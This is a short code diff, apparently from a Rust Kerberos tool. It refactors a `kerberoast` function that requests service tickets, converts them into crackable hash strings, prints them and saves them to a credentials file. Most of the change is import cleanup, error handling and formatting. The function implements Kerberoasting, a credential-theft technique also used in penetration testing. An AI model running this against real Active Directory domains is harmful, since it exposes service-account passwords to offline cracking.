@@ -1,12 +1,12 @@
 use crate::ask::{get_user_tgt, request_tgs};
 use crate::crack::{tgs_to_crack_string, CrackFormat};
 use crate::cred_format::CredentialFormat;
+use crate::error::Result;
 use crate::file::save_cred_in_file;
 use crate::krb_user::KerberosUser;
 use crate::transporter::KerberosTransporter;
-use crate::error::{Result, Error};
 use kerberos_crypto::Key;
-use log::{info, warn};
+use log::info;
 
 pub fn kerberoast(
     user: KerberosUser,
@@ -36,18 +36,20 @@ pub fn kerberoast(
             transporter,
         ) {
             Err(err) => match &err {
-                Error::NetworkError(_, _) => return Err(err),
-                _ => warn!("{}", err)
-            }
+                _ => return Err(err),
+            },
             Ok((tgs, krb_cred_info_tgs)) => {
-
-                let crack_str = tgs_to_crack_string(&username, &service, &tgs, crack_format);
+                let crack_str = tgs_to_crack_string(
+                    &username,
+                    &service,
+                    &tgs,
+                    crack_format,
+                );
                 println!("{}", crack_str);
                 krb_cred_plain.cred_part.ticket_info.push(krb_cred_info_tgs);
                 krb_cred_plain.tickets.push(tgs);
             }
         }
-        
     }
 
     info!("Save {} TGSs in {}", username, creds_file);
